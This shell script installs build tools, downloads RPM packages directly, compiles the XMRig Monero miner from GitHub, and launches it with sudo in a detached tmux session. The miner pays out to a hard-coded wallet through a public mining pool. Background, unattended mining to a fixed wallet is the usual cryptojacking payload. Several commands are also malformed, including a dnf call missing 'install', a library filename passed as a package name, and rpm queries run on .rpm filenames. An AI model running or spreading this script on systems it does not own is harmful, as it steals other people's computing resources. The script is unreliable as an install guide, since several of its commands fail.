echo "Tmux not found. Installing..."
sudo dnf -y tmux
sudo dnf install -y epel-release
sudo yum config-manager --set-enabled appstream
dnf install -y pkg-config
dnf install -y rdma-core-devel
dnf install -y hwloc-libs.x86_64
dnf install -y libhwloc.so.15
wget http://mirror.centos.org/centos/8-stream/PowerTools/x86_64/os/Packages/hwloc-devel-2.2.0-3.el8.x86_64.rpm
sudo rpm -i hwloc-devel-2.2.0-3.el8.x86_64.rpm
sudo rpm -q hwloc-devel-2.2.0-3.el8.x86_64.rpm
dnf install -y libstdc++-devel
wget https://rpmfind.net/linux/centos/8-stream/PowerTools/x86_64/os/Packages/libstdc++-static-8.5.0-20.el8.x86_64.rpm
sudo rpm -i libstdc++-static-8.5.0-20.el8.x86_64.rpm
sudo rpm -q libstdc++-static-8.5.0-20.el8.x86_64.rpm
sudo dnf install -y git make cmake gcc gcc-c++ libstdc++-static hwloc-devel openssl-devel automake libtool autoconf
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
cd xmrig/scripts && ./build.uv.sh
cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps
make -j$(nproc)
sudo dnf update
sudo dnf install -y tmux

tmux new-session -d -s my_session

tmux send-keys -t my_session 'sudo ./xmrig -o pool.supportxmr.com:5555 -p xx -u 439E2t22jShLX1BvDygJKpbDExiYfzXsahQU59ZvJwXkb1NiYe1YYbPgqpTmXBnX1944CphnWAf1XHQMLsGnBBfmL2YigCU' C-m

